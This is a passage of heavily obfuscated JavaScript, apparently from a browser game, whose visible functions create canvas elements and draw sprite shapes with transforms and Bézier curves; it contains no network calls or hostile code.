			Δ.translate(ᐃⵠⵠ / ⲆⵠΔΔ - 50 * ᐃ, ⵠⵠᐃ / 2 + ᐃ * 40);
			Δ.rotate(Math.PI / ᐃⵠⲆΔᐃ);
			Δ.globalAlpha = ⵠⲆΔ;
			Δ.translate(ΔⲆⵠⲆ, -ⵠΔΔⲆᐃ * ᐃ);
			ⵠΔⵠᐃ(Δ, ᐃΔΔⲆ, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.restore();
			var ⲆⲆⵠ = ᐃ * 30;
			var ΔⵠΔΔ = ⲆⲆⵠ / 4;
			Δ.save();
			Δ.translate(ᐃⵠⵠ / 2 + ᐃ * 5, ⵠⵠᐃ / 2 - ᐃⲆᐃΔⵠ * ᐃ);
			Δ.rotate(Math.PI / -1.8);
			Δ.globalAlpha = 1;
			Δ.translate(0, ᐃ * -ⲆΔⲆⲆΔ);
			ⵠΔⵠᐃ(Δ, ⲆΔⲆᐃ, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔΔⵠ]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃⵠⵠ / ⵠⵠΔⲆ + 0 * ᐃ, ⵠⵠᐃ / ⲆⵠΔΔ + 10 * ᐃ);
			Δ.rotate(Math.PI / ⵠⲆⵠⲆ);
			Δ.globalAlpha = ΔⵠΔⵠ;
			Δ.translate(Δⵠᐃ, -20 * ᐃ);
			ⵠΔⵠᐃ(Δ, ᐃᐃⲆᐃ, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠⲆ]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃⵠⵠ / 2 - ᐃ * 45, ⵠⵠᐃ / Ⲇᐃᐃⵠ + 35 * ᐃ);
			Δ.rotate(Math.PI / ᐃⲆΔⵠ);
			Δ.globalAlpha = ΔᐃⲆⵠ;
			Δ.translate(ΔᐃΔΔ, -20 * ᐃ);
			ⵠΔⵠᐃ(Δ, ᐃⲆⵠⵠ, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠΔ]);
			Δ.restore();
			ⵠᐃᐃ(Δ, ᐃⵠⵠ / 2 - ΔΔᐃⲆⲆ * ᐃ, ⵠⵠᐃ / ⵠⲆⵠⲆ + ᐃᐃⵠⵠⵠ * ᐃ, 5);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔⲆ]);
			return Ⲇⵠ
		}
		const Ⲇᐃᐃᐃ = ᐃΔΔ;

		function ⲆⵠΔⲆᐃΔΔ(ᐃ, ⲆⲆⵠ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 2 * (ᐃ * ⲆⲆⵠ);
			var ⵠⵠᐃ = ⲆⲆⵠ * ᐃ * ᐃⲆΔⲆ;
			var Δⵠ = ᐃⵠⵠ / Ⲇᐃᐃⵠ;
			var ⲆⵠⲆ = ⵠⵠᐃ / 2;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(Δⵠ, ⲆⵠⲆ);
			ⵠᐃᐃ(Δ, 0, 0, ᐃ * ⲆⲆⵠ, Δᐃᐃᐃ);
			ΔⲆ(Δ, Ⲇᐃ);
			return Ⲇⵠ
		}

		function ⵠⲆⲆⲆⵠΔᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 234 * ᐃ;
			Ⲇⵠ.height = ᐃ * 183;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(ᐃ * 76, ᐃ * 25);
			Δ.bezierCurveTo(ᐃ * 150, ⲆΔⵠⵠ * ᐃ, 181 * ᐃ, ᐃ * 22, 203 * ᐃ, 41 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 225, ᐃ * 63, ᐃ * 225, 105 * ᐃ, 198 * ᐃ, 133 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 179, ᐃ * 157, 134 * ᐃ, ᐃ * 178, ᐃ * 81, 164 * ᐃ);
			Δ.bezierCurveTo(19 * ᐃ, ᐃ * 148, ΔᐃⲆᐃ * ᐃ, ᐃ * 95, 21 * ᐃ, 66 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 34, ᐃ * 39, ᐃ * 52, 33 * ᐃ, ᐃ * 75, 25 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠ], Ⲇᐃ[Δᐃᐃᐃ], ᐃⵠⵠΔ * ᐃ);
			return Ⲇⵠ
		}

		function ΔⲆⵠⵠᐃΔⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 220;
			Ⲇⵠ.height = 180 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ᐃ * -90, ᐃ * -150);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(104 * ᐃ, ᐃ * 237.8000030517578);
			Δ.bezierCurveTo(ᐃ * 110, ᐃ * 237.8000030517578, 110 * ᐃ, 237.8000030517578 * ᐃ, 116 * ᐃ, ᐃ * 237.8000030517578);
			Δ.bezierCurveTo(116 * ᐃ, ᐃ * 241.8000030517578, 116 * ᐃ, ᐃ * 241.8000030517578, ᐃ * 116, ᐃ * 245.8000030517578);
			Δ.bezierCurveTo(ᐃ * 115, 245.3000030517578 * ᐃ, 115 * ᐃ, 245.3000030517578 * ᐃ, 114 * ᐃ, ᐃ * 244.8000030517578);
			Δ.bezierCurveTo(109.5 * ᐃ, 244.8000030517578 * ᐃ, 109.5 * ᐃ, 244.8000030517578 * ᐃ, 105 * ᐃ, ᐃ * 244.8000030517578);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⲆ], Ⲇᐃ[5], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 115, ᐃ * 211.20000457763672);
			Δ.bezierCurveTo(ᐃ * 106, ᐃ * 216.20000457763672, ᐃ * 101, 234.20000457763672 * ᐃ, 102 * ᐃ, ᐃ * 241.20000457763672);
			Δ.bezierCurveTo(102 * ᐃ, 260.2000045776367 * ᐃ, 115 * ᐃ, ᐃ * 269.2000045776367, 115 * ᐃ, 269.2000045776367 * ᐃ);
			Δ.bezierCurveTo(116 * ᐃ, 265.2000045776367 * ᐃ, ᐃ * 115.5, 265.2000045776367 * ᐃ, 116 * ᐃ, 261.2000045776367 * ᐃ);
			Δ.bezierCurveTo(112 * ᐃ, ᐃ * 264, ᐃ * 108, 254 * ᐃ, 106 * ᐃ, ᐃ * 242);
			Δ.bezierCurveTo(ᐃ * 105, 232 * ᐃ, ᐃ * 110, ᐃ * 222, 115 * ᐃ, ᐃ * 218);
			Δ.bezierCurveTo(ᐃ * 116, 216.75 * ᐃ, 115.5 * ᐃ, ᐃ * 217.375, ᐃ * 116, ᐃ * 216.75);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠⲆⲆ], Ⲇᐃ[ᐃᐃⲆᐃ], ᐃ * ⲆⲆΔᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 120, ᐃ * 207);
			Δ.bezierCurveTo(115 * ᐃ, ᐃ * 206, 114 * ᐃ, ᐃ * 209, 114 * ᐃ, 211 * ᐃ);
			Δ.bezierCurveTo(114 * ᐃ, ᐃ * 268, ᐃ * 114, 241 * ᐃ, 114 * ᐃ, 271 * ᐃ);
			Δ.bezierCurveTo(115 * ᐃ, ᐃ * 276, 118 * ᐃ, ᐃ * 276, 120 * ᐃ, 276 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 122, ᐃ * 273, ᐃ * 120.5, 274.5 * ᐃ, 121 * ᐃ, 273 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 121, 241 * ᐃ, 121 * ᐃ, 241 * ᐃ, ᐃ * 121, 209 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⵠᐃ], Ⲇᐃ[4], ⲆᐃᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 284, 238 * ᐃ);
			Δ.bezierCurveTo(289.5 * ᐃ, 238 * ᐃ, 289.5 * ᐃ, ᐃ * 238, ᐃ * 295, 238 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 295, 241.5 * ᐃ, ᐃ * 295, ᐃ * 241.5, ᐃ * 295, 245 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 289.5, 245 * ᐃ, ᐃ * 289.5, ᐃ * 245, ᐃ * 284, ᐃ * 245);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[4], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 283, ᐃ * 211);
			Δ.bezierCurveTo(ᐃ * 293, 216 * ᐃ, ᐃ * 297, 231 * ᐃ, 297 * ᐃ, ᐃ * 241);
			Δ.bezierCurveTo(298 * ᐃ, 254 * ᐃ, 290 * ᐃ, ᐃ * 265, 284 * ᐃ, 269 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 283, 266 * ᐃ, ᐃ * 283.5, 266 * ᐃ, 283 * ᐃ, ᐃ * 263);
			Δ.bezierCurveTo(290 * ᐃ, ᐃ * 260, ᐃ * 292, ᐃ * 251, 293 * ᐃ, 242 * ᐃ);
			Δ.bezierCurveTo(292 * ᐃ, 223 * ᐃ, 289 * ᐃ, 224 * ᐃ, ᐃ * 284, 218 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠΔ], Ⲇᐃ[ΔⲆⲆⲆ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 280, ᐃ * 206);
			Δ.bezierCurveTo(ᐃ * 284, 206 * ᐃ, 285 * ᐃ, ᐃ * 208, 285 * ᐃ, 211 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 285, ᐃ * 241.5, 285 * ᐃ, ᐃ * 241.5, 285 * ᐃ, 272 * ᐃ);
			Δ.bezierCurveTo(284 * ᐃ, ᐃ * 275, 284 * ᐃ, 275 * ᐃ, 280 * ᐃ, ᐃ * 275);
			Δ.bezierCurveTo(ᐃ * 279, 273.5 * ᐃ, 279 * ᐃ, ᐃ * 273.5, ᐃ * 278, ᐃ * 272);
			Δ.bezierCurveTo(ᐃ * 278, 240.5 * ᐃ, ᐃ * 278, 240.5 * ᐃ, 278 * ᐃ, ᐃ * 209);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⵠⵠⲆ], Ⲇᐃ[Ⲇᐃⵠᐃ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(138 * ᐃ, 298.40000915527344 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 141, 311.40000915527344 * ᐃ, 151 * ᐃ, 314.40000915527344 * ᐃ, 162 * ᐃ, ᐃ * 316.40000915527344);
			Δ.bezierCurveTo(224 * ᐃ, ᐃ * 316.40000915527344, ᐃ * 200, ᐃ * 315.90000915527344, ᐃ * 238, 315.40000915527344 * ᐃ);
			Δ.bezierCurveTo(254 * ᐃ, ᐃ * 316.40000915527344, ᐃ * 261, 306.40000915527344 * ᐃ, ᐃ * 264, ᐃ * 298.40000915527344);
			Δ.bezierCurveTo(ᐃ * 255, 304.40000915527344 * ᐃ, ᐃ * 250, ᐃ * 306.40000915527344, ᐃ * 244, 306.40000915527344 * ᐃ);
			Δ.bezierCurveTo(201 * ᐃ, 306.90000915527344 * ᐃ, ᐃ * 201, ᐃ * 306.90000915527344, 158 * ᐃ, ᐃ * 307.40000915527344);
			Δ.bezierCurveTo(150 * ᐃ, 306.40000915527344 * ᐃ, 148 * ᐃ, 306.40000915527344 * ᐃ, ᐃ * 139, 300.40000915527344 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠΔ], Ⲇᐃ[ⵠᐃᐃⲆ], ᐃ * ⲆⵠΔΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 161, ᐃ * 177.5999984741211);
			Δ.bezierCurveTo(130 * ᐃ, 175.5999984741211 * ᐃ, ᐃ * 123, ᐃ * 190.5999984741211, ᐃ * 122, 205.5999984741211 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 121, 277.5999984741211 * ᐃ, ᐃ * 122, 242.5999984741211 * ᐃ, 122 * ᐃ, ᐃ * 279.5999984741211);
			Δ.bezierCurveTo(ᐃ * 128, ᐃ * 297.5999984741211, ᐃ * 137, 299.5999984741211 * ᐃ, ᐃ * 143, 300.5999984741211 * ᐃ);
			Δ.bezierCurveTo(163 * ᐃ, ᐃ * 301.0999984741211, ᐃ * 163, ᐃ * 301.0999984741211, 183 * ᐃ, ᐃ * 301.5999984741211);
			Δ.bezierCurveTo(150 * ᐃ, 300.5999984741211 * ᐃ, 135 * ᐃ, 290.5999984741211 * ᐃ, ᐃ * 134, 267.5999984741211 * ᐃ);
			Δ.bezierCurveTo(133 * ᐃ, 245.5999984741211 * ᐃ, ᐃ * 146, 235.5999984741211 * ᐃ, ᐃ * 164, ᐃ * 235.5999984741211);
			Δ.bezierCurveTo(ᐃ * 206, ᐃ * 236.0999984741211, 206 * ᐃ, 236.0999984741211 * ᐃ, ᐃ * 248, 236.5999984741211 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 266, 243.5999984741211 * ᐃ, 268 * ᐃ, 259.5999984741211 * ᐃ, ᐃ * 267, 266.5999984741211 * ᐃ);
			Δ.bezierCurveTo(266 * ᐃ, 288.5999984741211 * ᐃ, 251 * ᐃ, ᐃ * 294.5999984741211, ᐃ * 244, 297.5999984741211 * ᐃ);
			Δ.bezierCurveTo(228.5 * ᐃ, ᐃ * 299.5999984741211, 228.5 * ᐃ, ᐃ * 299.5999984741211, ᐃ * 213, ᐃ * 301.5999984741211);
			Δ.bezierCurveTo(ᐃ * 236, 301.0999984741211 * ᐃ, ᐃ * 236, 301.0999984741211 * ᐃ, 259 * ᐃ, ᐃ * 300.5999984741211);
			Δ.bezierCurveTo(272 * ᐃ, 295.5999984741211 * ᐃ, ᐃ * 277, 288.5999984741211 * ᐃ, ᐃ * 278, 271.5999984741211 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 277.5, 236.5999984741211 * ᐃ, ᐃ * 277.5, ᐃ * 236.5999984741211, ᐃ * 277, ᐃ * 201.5999984741211);
			Δ.bezierCurveTo(276 * ᐃ, ᐃ * 186.5999984741211, 265 * ᐃ, ᐃ * 178.5999984741211, 254 * ᐃ, ᐃ * 177.5999984741211);
			Δ.bezierCurveTo(247.5 * ᐃ, 177.5999984741211 * ᐃ, 247.5 * ᐃ, ᐃ * 177.5999984741211, 241 * ᐃ, 177.5999984741211 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 255, ᐃ * 202.5999984741211, 214 * ᐃ, ᐃ * 217.5999984741211, 201 * ᐃ, 215.5999984741211 * ᐃ);
			Δ.bezierCurveTo(170 * ᐃ, 215.5999984741211 * ᐃ, 152 * ᐃ, 197.5999984741211 * ᐃ, ᐃ * 161, ᐃ * 178.5999984741211);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⵠᐃ], Ⲇᐃ[ⵠΔᐃΔ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(162 * ᐃ, 175.5999984741211 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 153, ᐃ * 176.0999984741211, ᐃ * 153, ᐃ * 176.0999984741211, 144 * ᐃ, ᐃ * 176.5999984741211);
			Δ.bezierCurveTo(ᐃ * 125, ᐃ * 178.5999984741211, ᐃ * 121, 196.5999984741211 * ᐃ, 121 * ᐃ, ᐃ * 207.5999984741211);
			Δ.bezierCurveTo(ᐃ * 121, 243.20000076293945 * ᐃ, 121 * ᐃ, 243.20000076293945 * ᐃ, 121 * ᐃ, ᐃ * 278.8000030517578);
			Δ.bezierCurveTo(ᐃ * 126, 298.8000030517578 * ᐃ, 137 * ᐃ, 300.8000030517578 * ᐃ, 146 * ᐃ, 302.8000030517578 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 200.5, 302.8000030517578 * ᐃ, ᐃ * 200.5, ᐃ * 302.8000030517578, ᐃ * 255, 302.8000030517578 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 271, 301.8000030517578 * ᐃ, 279 * ᐃ, 288.8000030517578 * ᐃ, 279 * ᐃ, 273.8000030517578 * ᐃ);
			Δ.bezierCurveTo(279 * ᐃ, 236.8000030517578 * ᐃ, ᐃ * 279, 236.8000030517578 * ᐃ, ᐃ * 279, 199.8000030517578 * ᐃ);
			Δ.bezierCurveTo(274 * ᐃ, 178.8000030517578 * ᐃ, 263 * ᐃ, ᐃ * 177.8000030517578, 255 * ᐃ, ᐃ * 175.8000030517578);
			Δ.bezierCurveTo(ᐃ * 248, 175.8000030517578 * ᐃ, 248 * ᐃ, 175.8000030517578 * ᐃ, 241 * ᐃ, 175.8000030517578 * ᐃ);
			Δ.bezierCurveTo(240 * ᐃ, 175.8000030517578 * ᐃ, ᐃ * 240, ᐃ * 175.8000030517578, 239 * ᐃ, ᐃ * 175.8000030517578);
			Δ.bezierCurveTo(ᐃ * 254, ᐃ * 200.8000030517578, 222 * ᐃ, 211.8000030517578 * ᐃ, ᐃ * 202, ᐃ * 212.8000030517578);
			Δ.bezierCurveTo(168 * ᐃ, ᐃ * 213.8000030517578, 151 * ᐃ, ᐃ * 190.8000030517578, ᐃ * 163, ᐃ * 176.8000030517578);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆⵠᐃΔ], ⵠᐃᐃΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 198, ᐃ * 161.4000015258789);
			Δ.bezierCurveTo(ᐃ * 198, 186.9000015258789 * ᐃ, 198 * ᐃ, 186.9000015258789 * ᐃ, 198 * ᐃ, ᐃ * 212.4000015258789);
			Δ.bezierCurveTo(201 * ᐃ, ᐃ * 212.4000015258789, 201 * ᐃ, 212.4000015258789 * ᐃ, 204 * ᐃ, ᐃ * 212.4000015258789);
			Δ.bezierCurveTo(204 * ᐃ, 186.9000015258789 * ᐃ, ᐃ * 204, 186.9000015258789 * ᐃ, ᐃ * 204, ᐃ * 161.4000015258789);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[4], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 161, 194 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 188, ᐃ * 169, ᐃ * 231, ᐃ * 179, 241 * ᐃ, ᐃ * 194);
			Δ.bezierCurveTo(239.5 * ᐃ, ᐃ * 196, 239.5 * ᐃ, ᐃ * 196, 238 * ᐃ, 198 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 221, ᐃ * 179, ᐃ * 182, ᐃ * 182, ᐃ * 165, 198 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠᐃⲆ], Ⲇᐃ[ⵠΔᐃΔ], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(ᐃ * 157, 188.80000019073486 * ᐃ);
			Δ.bezierCurveTo(162 * ᐃ, 150.80000019073486 * ᐃ, 241 * ᐃ, 150.80000019073486 * ᐃ, 245 * ᐃ, 188.80000019073486 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 242, 224.80000019073486 * ᐃ, 162 * ᐃ, ᐃ * 228.80000019073486, ᐃ * 157, ᐃ * 188.80000019073486);
			Δ.bezierCurveTo(159 * ᐃ, ᐃ * 188.80000019073486, ᐃ * 159, ᐃ * 188.80000019073486, 161 * ᐃ, ᐃ * 188.80000019073486);
			Δ.bezierCurveTo(168 * ᐃ, 216.80000019073486 * ᐃ, ᐃ * 231, ᐃ * 218.80000019073486, ᐃ * 241, ᐃ * 188.80000019073486);
			Δ.bezierCurveTo(ᐃ * 236, ᐃ * 156.80000019073486, ᐃ * 169, ᐃ * 152.80000019073486, 161 * ᐃ, 188.80000019073486 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃΔΔ], Ⲇᐃ[ΔⲆᐃⵠᐃ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 156, ᐃ * 188);
			Δ.bezierCurveTo(160 * ᐃ, ᐃ * 164, ᐃ * 183, 159 * ᐃ, 201 * ᐃ, 158 * ᐃ);
			Δ.bezierCurveTo(232 * ᐃ, 159 * ᐃ, ᐃ * 244, ᐃ * 174, ᐃ * 246, ᐃ * 188);
			Δ.bezierCurveTo(ᐃ * 245, ᐃ * 212, ᐃ * 213, ᐃ * 219, ᐃ * 201, ᐃ * 218);
			Δ.bezierCurveTo(ᐃ * 181, ᐃ * 221, ᐃ * 158, ᐃ * 207, ᐃ * 156, ᐃ * 190);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆⵠᐃΔ], ⲆᐃⲆᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(162 * ᐃ, 189 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 166, ᐃ * 170, ᐃ * 185, ᐃ * 165, 201 * ᐃ, ᐃ * 164);
			Δ.bezierCurveTo(ᐃ * 227, ᐃ * 165, ᐃ * 240, ᐃ * 178, ᐃ * 239, ᐃ * 188);
			Δ.bezierCurveTo(ᐃ * 239, ᐃ * 204, ᐃ * 210, ᐃ * 210, 201 * ᐃ, 210 * ᐃ);
			Δ.bezierCurveTo(182 * ᐃ, ᐃ * 211, ᐃ * 166, ᐃ * 200, 162 * ᐃ, ᐃ * 190);
			Δ.closePath();
			ΔⲆ(Δ, ⵠⵠⵠⲆⵠ, Ⲇᐃ[ᐃⲆᐃⲆⵠ], ᐃ * ⲆΔᐃΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 131, ᐃ * 262);
			Δ.bezierCurveTo(136 * ᐃ, ᐃ * 241, 144 * ᐃ, ᐃ * 236, 158 * ᐃ, 233 * ᐃ);
			Δ.bezierCurveTo(200.5 * ᐃ, 233 * ᐃ, 229 * ᐃ, ᐃ * 232, 243 * ᐃ, ᐃ * 233);
			Δ.bezierCurveTo(259 * ᐃ, ᐃ * 235, 267 * ᐃ, 248 * ᐃ, 269 * ᐃ, 260 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 269, ᐃ * 266.5, ᐃ * 269, 266.5 * ᐃ, 269 * ᐃ, 273 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 265, ᐃ * 290, 251 * ᐃ, ᐃ * 297, ᐃ * 242, ᐃ * 298);
			Δ.bezierCurveTo(202 * ᐃ, ᐃ * 298, 202 * ᐃ, ᐃ * 298, 162 * ᐃ, 298 * ᐃ);
			Δ.bezierCurveTo(148 * ᐃ, 298 * ᐃ, ᐃ * 136, ᐃ * 289, ᐃ * 132, ᐃ * 273);
			Δ.bezierCurveTo(131.5 * ᐃ, ᐃ * 268, ᐃ * 131.5, ᐃ * 268, ᐃ * 131, 263 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 135, 263 * ᐃ, 135 * ᐃ, 263 * ᐃ, 139 * ᐃ, ᐃ * 263);
			Δ.bezierCurveTo(139 * ᐃ, ᐃ * 281, ᐃ * 151, ᐃ * 287, ᐃ * 160, 290 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 200.5, ᐃ * 290, ᐃ * 200.5, 290 * ᐃ, ᐃ * 241, 290 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 252, ᐃ * 290, ᐃ * 257, ᐃ * 281, ᐃ * 262, 271 * ᐃ);
			Δ.bezierCurveTo(261.5 * ᐃ, 267 * ᐃ, 261.5 * ᐃ, 267 * ᐃ, 261 * ᐃ, 263 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 260, 249 * ᐃ, ᐃ * 251, 242 * ᐃ, 241 * ᐃ, 241 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 240.5, 240.5 * ᐃ, 240.5 * ᐃ, ᐃ * 240.5, 240 * ᐃ, 240 * ᐃ);
			Δ.bezierCurveTo(200 * ᐃ, 240 * ᐃ, 200 * ᐃ, 240 * ᐃ, 160 * ᐃ, ᐃ * 240);
			Δ.bezierCurveTo(145 * ᐃ, ᐃ * 244, 142 * ᐃ, ᐃ * 250, 139 * ᐃ, ᐃ * 264);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆᐃᐃΔ], Ⲇᐃ[ⵠΔᐃΔ], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(130 * ᐃ, ᐃ * 264);
			Δ.bezierCurveTo(132 * ᐃ, 244 * ᐃ, ᐃ * 144, ᐃ * 235, ᐃ * 157, 232 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 245, 232 * ᐃ, ᐃ * 201, 232 * ᐃ, ᐃ * 245, 232 * ᐃ);
			Δ.bezierCurveTo(264 * ᐃ, 235 * ᐃ, ᐃ * 269, 251 * ᐃ, ᐃ * 270, ᐃ * 264);
			Δ.bezierCurveTo(272 * ᐃ, 291 * ᐃ, 248 * ᐃ, 299 * ᐃ, ᐃ * 242, ᐃ * 299);
			Δ.bezierCurveTo(200 * ᐃ, ᐃ * 299, 200 * ᐃ, ᐃ * 299, ᐃ * 158, 299 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 139, ᐃ * 298, ᐃ * 130, 276 * ᐃ, 130 * ᐃ, ᐃ * 265);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆⵠᐃⲆ], ⵠⲆⵠⲆΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 140, ᐃ * 265.33333587646484);
			Δ.bezierCurveTo(ᐃ * 141, 250.33333587646484 * ᐃ, ᐃ * 148, 244.33333587646484 * ᐃ, 160 * ᐃ, ᐃ * 241.33333587646484);
			Δ.bezierCurveTo(200 * ᐃ, ᐃ * 241.33333587646484, 200 * ᐃ, ᐃ * 241.33333587646484, ᐃ * 240, ᐃ * 241.33333587646484);
			Δ.bezierCurveTo(ᐃ * ᐃⲆᐃⲆᐃⵠⲆ, 243.33333587646484 * ᐃ, 260 * ᐃ, 255.33333587646484 * ᐃ, 260 * ᐃ, 265.33333587646484 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 261, 281.33333587646484 * ᐃ, 247 * ᐃ, ᐃ * 289.33333587646484, ᐃ * 240, 289.33333587646484 * ᐃ);
			Δ.bezierCurveTo(161 * ᐃ, ᐃ * 289.33333587646484, ᐃ * 200.5, ᐃ * 289.33333587646484, ᐃ * 161, 289.33333587646484 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 149, 288.33333587646484 * ᐃ, 142 * ᐃ, ᐃ * 278.33333587646484, ᐃ * 140, 266.33333587646484 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆⲆⲆⲆᐃ, Ⲇᐃ[ΔⲆⲆⲆ], 6 * ᐃ);
			Δ.globalAlpha = .5;
			Δ.scale(1, 1);
			Δ.translate(ᐃ * 105, 155 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(59.27557373046875 * ᐃ, 20.406280517578125 * ᐃ);
